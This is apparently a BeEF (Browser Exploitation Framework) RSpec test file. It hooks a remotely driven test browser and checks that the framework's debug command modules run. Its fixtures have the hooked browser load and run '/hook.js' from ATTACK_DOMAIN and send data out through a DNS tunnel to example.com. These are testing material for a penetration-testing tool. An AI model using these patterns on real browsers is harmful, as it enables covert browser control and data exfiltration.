#
# Copyright (c) 2006-2021 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#

require 'rest-client'
require 'json'
require_relative '../../../spec_helper'
require_relative '../../../support/constants'
require_relative '../../../support/beef_test'

RSpec.describe 'BeEF Debug Command Modules:', bs: true do

  def report_status(result)
    result = expect(result).to eq('true')
    status = result ? 'passed' : 'failed'
    @driver.execute_script("browserstack_executor: {\"action\": \"setSessionStatus\", \"arguments\": {\"status\":\"#{status}\", \"reason\": \"\"}}")
  end

  def test_command(cmd_name, payload)
    cmd_id = @debug_mod_names_ids[cmd_name]
    result_data = post_command(cmd_id, payload)
    report_status(result_data['success'])
  end

  def post_command(cmd_id, payload)
    5.times do |i|
      begin
        response = RestClient.post "#{RESTAPI_MODULES}/#{@session}/#{cmd_id}?token=#{@token}",
                               payload.to_json,
                               content_type: :json
        return JSON.parse(response.body) if i > 5 || response.code == 200
      rescue
        sleep(5)
        retry
      end
    end
    return nil
  end
  

  def get_token
    token_response = RestClient.post 'http://localhost:3000/api/admin/login', { "username": ENV['TEST_BEEF_USER'], "password": ENV['TEST_BEEF_PASS'] }.to_json, content_type: 'application/json' 
    JSON.parse(token_response.body)['token']
  end

  before(:example) do
      @config = BeEF::Core::Configuration.instance
      @caps = CONFIG['common_caps'].merge(CONFIG['browser_caps'][TASK_ID])
      @caps['name'] = self.class.description || ENV['name'] || 'no-name'
      @caps['browserstack.local'] = true
      @caps['browserstack.localIdentifier'] = ENV['BROWSERSTACK_LOCAL_IDENTIFIER']
      @caps["javascriptEnabled"] = true #Additionally, include this capability for JavaScript executors to work

      @token = get_token

      @driver = Selenium::WebDriver.for(:remote,
                                        url: "http://#{CONFIG['user']}:#{CONFIG['key']}@#{CONFIG['server']}/wd/hub",
                                        desired_capabilities: @caps)
      wait = Selenium::WebDriver::Wait.new(timeout: 30) # seconds

      @driver.navigate.to VICTIM_URL.to_s

      sleep 1 until wait.until { @driver.execute_script('return window.beef.session.get_hook_session_id().length') > 0 }

      @session = @driver.execute_script('return window.beef.session.get_hook_session_id()')
      # Grab Command Module IDs as they can differ from machine to machine
      @debug_mod_ids = JSON.parse(RestClient.get("#{RESTAPI_MODULES}?token=#{@token}"))
      @debug_mod_names_ids = {}
      @debug_mods = @debug_mod_ids.to_a.select { |cmd_mod| cmd_mod[1]['category'] == 'Debug' }
                                  .map do |debug_mod|
                                    @debug_mod_names_ids[debug_mod[1]['class']] = debug_mod[1]['id']
                                  end
  end

  after(:example) do
    @driver.quit
  end

  it 'The Test_beef.debug() command module successfully executes' do
    test_command('Test_beef_debug', { "msg": 'test' })
  end

  it 'The Return ASCII Characters command module successfully executes' do
    test_command('Test_return_ascii_chars', {})
  end

  it 'The Return Image command module successfully executes' do
    test_command('Test_return_image', {})
  end

  it 'The Test HTTP Redirect command module successfully executes' do
    test_command('Test_http_redirect', {})
  end

  it 'The Test Returning Results/Long String command module successfully executes' do
    payload = { "repeat": 20,
                "repeat_string": 'beef' }
    test_command('Test_return_long_string', payload)
  end

  it 'The Test Network Request command module successfully executes' do
    payload = { "scheme": 'http',
                "method": 'GET',
                "domain": ATTACK_DOMAIN.to_s,
                "port": @config.get('beef.http.port').to_s,
                "path": '/hook.js',
                "anchor": 'anchor',
                "data": 'query=testquerydata',
                "timeout": '10',
                "dataType": 'script' }
    test_command('Test_network_request', payload)
  end

  it 'The Test DNS Tunnel command module successfully executes' do
    payload = { "domain": 'example.com',
                "data": 'Lorem ipsum' }
    test_command('Test_dns_tunnel_client', payload)
  end

  it 'The Test CORS Request command module successfully executes' do
    payload = { "method": 'GET',
                "url": 'example.com',
                "data": {
                  "test": 'data' }}
    test_command('Test_cors_request', payload)
  end
end
